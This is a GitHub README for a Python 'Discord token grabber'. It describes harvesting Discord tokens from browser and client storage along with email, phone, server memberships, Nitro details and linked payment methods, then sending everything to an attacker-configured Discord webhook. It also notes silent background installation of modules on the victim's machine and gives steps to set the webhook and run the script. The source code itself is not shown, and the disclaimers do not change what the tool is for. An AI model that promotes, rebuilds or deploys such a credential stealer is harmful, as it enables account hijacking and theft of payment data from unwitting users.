
<p align="center">
  <img src="https://3684636823-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FAAWXLgBhsxb38Q3iF3ha%2Fsocialpreview%2FJYYwVSNx9yLnXY8adfAU%2Fbanner.png?alt=media&token=264b3ce3-6643-4b55-8990-ca5cd2516dce">
</p>

<h1 align="center">[Discord] - Token grabber</h1>
<p align="center">
  <a href="https://github.com/AstraaDev/Discord-SelfBot/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-important">
  </a>
  <a href="https://github.com/AstraaDev">
    <img src="https://img.shields.io/github/repo-size/AstraaDev/Discord-Token-Grabber.svg?label=Repo%20size&style=flat-square">
  </a>
</p>

This script is designed to collect Discord tokens and user information by scanning local storage files from various browser applications and extensions such as Discord, Chrome, Opera, and others. It retrieves sensitive information like tokens, Nitro subscription details, servers (guilds), and other account details, then sends it to a Discord webhook in a formatted message.

---

## Disclaimer
This script is potentially malicious and unethical. It can be used for malicious purposes, such as stealing user tokens, personal information, and other sensitive data. Using this script for malicious purposes without the user's consent is illegal and violates ethical guidelines. Do not use this script without proper authorization.

---

# Features
- [x] - [Retrieves Discord tokens from local storage files](https://github.com/AstraaDev/Discord-Token-Grabber) - Scans local storage files from multiple browsers and Discord clients to collect Discord authentication tokens.
- [x] - [Collects user information such as email, phone number, username, and server (guild) memberships](https://github.com/AstraaDev/Discord-Token-Grabber) - Gathers essential user details from the Discord API, including email, phone number, and server memberships.
- [x] - [Fetches Nitro subscription details, including expiry date and available boosts](https://github.com/AstraaDev/Discord-Token-Grabber) - Retrieves information about Discord Nitro subscription status, including expiry date and available server boosts.
- [x] - [Gathers information about payment methods linked to the Discord account](https://github.com/AstraaDev/Discord-Token-Grabber) - Collects payment method details linked to the Discord account, including valid credit cards and PayPal accounts.
- [x] - [Sends all collected data to a specified Discord webhook](https://github.com/AstraaDev/Discord-Token-Grabber) - Sends the collected user data, Nitro details, guild information, and other relevant data to a configured Discord webhook for monitoring.
- [x] - [Automatic installation of missing modules](https://github.com/AstraaDev/Discord-Token-Grabber) - The script automatically installs any missing required modules in the background if they are not already present on the user's machine.

---

### Requirements
- Python 3.11 or lower (not compatible with Python 3.12 or 3.13)
- Required libraries:
  - `win32crypt`
  - `pycryptodome` (for AES decryption)

**Note**: The required libraries will be automatically installed if they are not already present on the user's machine. This may take some time during the first execution as the missing modules are installed in the background.

Alternatively, you can manually install the required libraries using `pip`:

```bash
pip install pypiwin32 pycryptodome
```

---

### Usage
1. **Clone the repository or download the script**.
2. **Modify the webhook URL**: In the `main()` function, replace the placeholder `WEBHOOK_URL` with your actual Discord webhook URL.
3. **Run the script**: The script will search for the local data files of various browsers and Discord clients to extract the stored tokens.

```bash
python main.py
```

---

### Important Notes
- The script is designed for **Windows systems only** (due to the use of `win32crypt` and `LocalAppData`).
- **Make sure to use this script responsibly and only for ethical purposes**.
- **Do not use this script to steal personal data** or perform actions without the user's consent. Misusing this script is illegal.

---

## Additional Information
- Need help? Join the [Discord Server](https://astraadev.github.io/discord).
- Contributions are welcome! Open an issue or create a pull request.
